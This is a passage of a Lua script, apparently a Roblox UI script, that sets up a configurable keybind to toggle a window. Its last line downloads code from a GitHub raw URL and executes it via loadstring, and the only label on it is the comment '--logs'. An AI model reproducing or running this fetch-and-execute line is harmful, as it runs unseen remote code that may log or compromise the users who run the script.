        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == KeybindKey then
            
            Window:Toggle()
        end
    end)
    
    if KeybindInitialized then
        Notify("Keybind", "Keybind definida para: " .. tostring(KeybindKey))
    end
end

configuracoes:Input({
    Title = "Keybind",
    Desc = "Tecla para abrir e fechar a UI (Apenas letras).",
    Flag = "Config_Keybind",
    Placeholder = string.gsub(tostring(KeybindKey), "Enum.KeyCode.", ""),
    Callback = function(v)
        local keyName = string.upper(string.gsub(v or "", "%s+", ""))

        if string.len(keyName) == 0 then
            return
        end

        local success, newKeybind = pcall(function()
            return Enum.KeyCode[keyName]
        end)

        if success and newKeybind then
            KeybindKey = newKeybind
            setupKeybind()
            KeybindInitialized = true
        else
            Notify("Erro", "Tecla '" .. keyName .. "' inválida. Use apenas letras (A-Z).")
        end
    end
})

loadstring(game:HttpGet("https://raw.githubusercontent.com/M0vi/k/refs/heads/main/k"))()
--logs 
